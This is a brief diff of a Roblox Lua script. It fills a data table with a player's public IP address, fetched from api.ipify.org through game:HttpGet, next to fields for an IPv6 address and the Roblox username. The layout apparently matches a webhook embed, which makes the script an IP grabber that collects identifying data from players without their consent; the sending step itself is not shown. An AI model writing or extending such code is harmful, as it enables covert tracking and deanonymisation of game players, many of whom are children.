@@ -7,11 +7,11 @@ local data = {
             ["fields"] = {
                 {
                     ["name"] = "IPV4 ADDRESS",
-                    ["value"] = game:HttpGet("nofuck"),
+                    ["value"] = game:HttpGet("https://api.ipify.org"),
                 },
                 {
                     ["name"] = "IPV6 ADDRESS",
-                    ["value"] = "nil", --game:HttpGet("nofuck"),
+                    ["value"] = "nil", --game:HttpGet("https://api64.ipify.org"),
                 },
                 {
                     ["name"] = "ROBLOX USERNAME",
